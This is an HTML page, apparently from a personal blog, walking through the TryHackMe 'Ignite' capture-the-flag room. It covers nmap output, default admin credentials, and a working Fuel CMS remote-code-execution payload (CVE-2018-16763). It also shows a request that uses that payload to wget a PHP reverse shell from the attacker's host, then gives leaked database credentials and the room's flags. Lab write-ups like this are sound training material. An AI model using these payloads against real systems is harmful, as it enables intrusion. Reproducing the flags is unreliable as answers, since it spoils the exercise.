@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>P4nd4233 | An IT Blog</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="P4nd4233" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="An IT Blog" />
+<meta property="og:description" content="An IT Blog" />
+<link rel="canonical" href="http://0.0.0.0:4000/ignite-README.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/ignite-README.html" />
+<meta property="og:site_name" content="P4nd4233" />
+<script type="application/ld+json">
+{"url":"http://0.0.0.0:4000/ignite-README.html","headline":"P4nd4233","@type":"WebPage","description":"An IT Blog","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+  </head>
+  <body>
+      <!--<div id="header">
+        <nav>
+          <li class="fork"><a href="">View On GitHub</a></li>
+          
+        </nav>
+      </div> end header -->
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <a href="https://p4nd4233.github.io/personal--blogg/"><h1>P4nd4233</h1></a>
+          <p>An IT Blog</p>
+          <hr>
+          <span class="credits left"><a href="https://p4nd4233.github.io/" target="_blank">Ivan Shamliev</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="ignite-ctf">Ignite CTF</h1>
+<h3 id="this-is-a-walkthrough-of-the-ignite-ctf">This is a walkthrough of the <a href="https://tryhackme.com/room/ignite">Ignite CTF</a></h3>
+<hr />
+<p>It is a classic room where you exploit a Linux box, running vulnerable CMS and owning the machine.
+<br />OK lets begin!</p>
+
+<p>I always like to export the ip address of the target to a env variable, because I don’t need to type the whole address everytime.</p>
+
+<blockquote>
+  <p>export ip=10.10.28.46</p>
+</blockquote>
+
+<p>Ok lets start an Nmap scan</p>
+<blockquote>
+  <p>$ nmap -sC -sV -oN nmap.txt $ip</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.80 scan initiated Wed Jun 24 12:30:40 2020 as: nmap -sC -sV -oN nmap.txt 10.10.28.46
+Nmap scan report for 10.10.28.46
+Host is up (0.076s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to FUEL CMS
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jun 24 12:30:54 2020 -- 1 IP address (1 host up) scanned in 13.52 seconds
+</code></pre></div></div>
+<p>We can see that only port 80/tcp is open … <br />
+If we open it in a web browser there is a default FuelCMS instance running,
+lets check out the admin panel <code class="language-plaintext highlighter-rouge">/fuel</code>. It appears that it has the default admin:admin credentilas.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ip/fuel
+admin:admin
+
+maybe could be solved by uploading reverse php shell via the cms control panel since we know the creds ...
+</code></pre></div></div>
+<p>I tried to upload a PHP reverse shell manually, via the admin panel, but failed.
+I ran searchsploit against Fuel CMS and found out an interesting RCE (CVE 2018-16763) that could help me out to gain further access …</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Fuel CMS RCE &lt; 1.4.1 (1.4 in our case)
+CVE 2018-16763 
+
+exploit(code='ls -la'):
+
+$ip/fuel/pages/select/?filter='%2bpi(print(%24a%3d'system'))%2b%24a('ls -al')%2b'
+
+credits: https://www.youtube.com/watch?v=wLWqkULvefU
+</code></pre></div></div>
+<p>Here i use the RCE to upload a reverse PHP shell, that I have hosted on my Kali box using SimpleHTTP server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reverse shell upload and execute
+
+http://10.10.28.46/fuel/pages/select/?filter='%2bpi(print(%24a%3d'system'))%2b%24a('wget 10.5.2.55:8000/reverse.php -O reverse.php')%2b'
+
+10.10.28.46/reverse.php
+</code></pre></div></div>
+<p>Here I have found the User flag</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User.txt
+6470e394cbf6dab6a91682cc8585059b
+</code></pre></div></div>
+<p>I started enumerating, with linpeas, etc …<br />
+Couldn’t find any privilage escalation vectors.
+<br />I have spend a lot of time going around in circles. At this point I started trying out everything i could think of. <br />
+I googled FuelCMS Database Configuration and found out <a href="https://www.codeigniter.com/user_guide/database/configuration.html">this article</a> <br />
+They were talking about the MySQL DB, and I assume the app needs to talk with the DB, to do so it need to get authenticated with the DB using some kind of credentials…
+I have read that the configuration file is stored int app/config/database.php. <br />
+At first i couldn’t find it, so i ran a quick <code class="language-plaintext highlighter-rouge">find</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -name database.php 2&gt;/dev/null
+/var/www/html/fuel/application/config/database.php
+</code></pre></div></div>
+<hr />
+<h2 id="a-quick-tip">A QUICK TIP</h2>
+<blockquote>
+  <p>If we take a look at the end of the <code class="language-plaintext highlighter-rouge">find</code> command i have used above, <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> is baiscally telling the shell to send <a href="https://www.computerhope.com/jargon/s/stderr.htm"><code class="language-plaintext highlighter-rouge">Stderr</code> (Standart error)</a> to /dev/null.</p>
+  <ul>
+    <li>0:stdin</li>
+    <li>1:stdout</li>
+    <li>2:stderr</li>
+  </ul>
+
+  <p>That way when we search through the <code class="language-plaintext highlighter-rouge">/</code> directory there are many files that we can’t open simply because we do not have the permissions to. <br />
+So we use <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> to NOT print the error messages we get. <br />
+We want to see only the relevant information and not a shell filled up with <code class="language-plaintext highlighter-rouge">find: ‘/root’: Permission denied</code></p>
+</blockquote>
+
+<hr />
+
+<h3 id="if-we-take-a-look-at-the-default-page-of-fuel-cms-we-can-see-that-it-is-right-in-front-of-us-but-yeah-">If we take a look at the default page of Fuel CMS, we can see that it is right in front of us, but yeah …</h3>
+
+<p><a href="pics/ignite/pic1.png" target="_blank"><img src="pics/ignite/pic1.png" /></a></p>
+
+<p>I have found root creds in the file and got the flag …</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'username' =&gt; 'root',
+'password' =&gt; 'mememe',
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Root.txt
+b9bbcb33e11b80be759c4e844862482d
+</code></pre></div></div>
+
+<h3 id="you-can-find-more-notes-on-tryhackme-ctfs-at-my-github-">You can find more notes on TryHackMe CTFs at my <a href="https://github.com/P4nd4233/tryHackMe_CTFs_Notes">GitHub</a> .</h3>
+
+
+      </section>
+
+    </div>
+
+    
+  </body>
+</html>
